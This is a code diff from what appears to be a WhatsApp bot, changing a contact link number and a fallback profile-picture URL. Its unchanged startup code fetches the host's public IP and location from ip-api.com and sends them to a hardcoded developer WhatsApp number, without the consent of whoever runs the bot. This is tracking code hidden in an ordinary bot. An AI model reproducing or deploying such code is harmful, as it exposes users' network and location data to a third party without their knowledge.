@@ -56,7 +56,7 @@ const starts = async (hyper = new WAConnection()) => {
     console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/94767043432?text=welcome"}}})
+       hyper.sendMessage("94767043432@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/lakshitha.jpg'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     hyper.on('connecting', () => {
@@ -94,12 +94,12 @@ const imageToBase64 = require('image-to-base64')
                 try {
                 pp_user = await hyper.getProfilePicture(mem)
                 } catch (e) {
-                pp_user = 'https://i.imgur.com/rJBKu0Z.jpg'
+                pp_user = 'https://github.com/niyababy.png'
             }
             try {
                 pp_grup = await hyper.getProfilePicture(anu.jid)
                 } catch (e) {
-                pp_grup = 'https://i.imgur.com/rJBKu0Z.jpg'
+                pp_grup = 'https://github.com/niyababy.png'
             }
           
 		      let buffu = await getBuffer(pp_user)
